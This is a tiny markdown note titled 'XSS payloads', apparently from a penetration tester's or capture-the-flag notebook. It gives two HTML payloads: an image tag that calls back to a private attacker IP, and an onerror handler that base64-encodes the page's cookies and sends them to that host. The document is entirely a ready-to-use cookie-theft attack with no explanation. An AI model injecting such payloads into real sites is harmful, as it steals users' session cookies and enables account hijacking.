# XSS payloads

```text
<img src=http://10.10.14.28/abc />
<img src=x onerror=this.src="http://10.10.14.28/?cookie="+btoa(document.cookie)/>
```



